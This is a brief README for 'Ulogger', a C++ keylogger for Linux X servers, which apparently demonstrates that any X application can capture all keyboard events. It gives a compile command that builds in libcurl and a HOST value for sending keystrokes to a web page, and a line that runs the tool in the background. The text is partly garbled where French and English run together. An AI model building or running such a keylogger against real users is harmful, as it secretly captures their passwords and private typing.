# Ulogger
  
Dev: https://twitter.com/atmon3r  
Sources: https://framagit.org/tuxicoman/keylogger  

C++ Keylogger pour Linux avec Xserver.   
Ce code illuThis code illustrates that each X application can listen to all keyboard events, even if it does not have the focus. 

Compile:  
`g++ -ansi -Wall -Wno-deprecated-declarations -pedantic -O3 -o keylogger keylogger.cpp -L/usr/X11R6/lib -lX11 -lcurl '-DHOST=(char*)"http://localhost/?page=keylog"'`

Usage:
`./keylogger &`
